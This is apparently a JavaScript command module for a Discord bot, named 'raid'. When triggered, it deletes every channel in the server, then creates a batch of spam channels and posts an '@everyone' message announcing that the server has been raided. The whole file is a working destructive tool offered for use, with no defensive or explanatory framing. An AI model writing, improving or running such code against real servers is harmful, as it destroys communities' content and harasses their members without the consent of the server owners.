const { ChannelType } = require('discord.js');

module.exports = {
  name: 'raid',
  description: 'Deletes all channels and performs a raid.',
  async execute(interaction) {
    const { guild } = interaction;

    // Defaults
    const defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${interaction.client.user} !!! \n @everyone`;
    const defaultSpamAMT = 10;
    const defaultChannelName = 'RAID';
    const defaultErrorMessage = 'An internal error has occurred, please check console.';

    const throwInteractionError = (errorMessage) => {
      interaction.reply({ content: errorMessage, ephemeral: true });
    }

    let spamAMTbyUser = interaction.options.getInteger('message-amount') || defaultSpamAMT;
    let userMessage = interaction.options.getString('raid-message') || defaultMessage;
    let userChannelName = interaction.options.getString('channel-name') || defaultChannelName;

    try {
      const channels = Array.from(guild.channels.cache.values());
      for (const channel of channels) {
        try {
          await channel.delete();
        } catch (error) {
          console.error("Error deleting channel:", error);
        }
      }
    } catch (error) {
        console.error("Error deleting channels:", error);
        throwInteractionError('Raid Failed ! Invalid Permissions.');
      return;
    }

    try {
        const newChannel = await guild.channels.create({
          name: `${userChannelName}`, 
          type: ChannelType.GuildText,
        });
  
        try{
          for (let i = 0; i < spamAMTbyUser; i++) {
            // Duplicate the channel
            const duplicateChannel = await guild.channels.create({
              name: `${userChannelName}-${i+1}`,
              type: ChannelType.GuildText,
              parent: newChannel.parent, // Set the same parent as the original channel if applicable
            });
        
            // Send message to duplicate channel
            await duplicateChannel.send(userMessage);
          }
        } catch (error) {
          throwInteractionError(defaultErrorMessage);
          console.error("Error creating duplicate channels:", error);
        }
        
      } catch (error) {
        throwInteractionError(defaultErrorMessage);
        console.log(`an error has occurred, ${error}`)
        return;
      }
    
  }
}
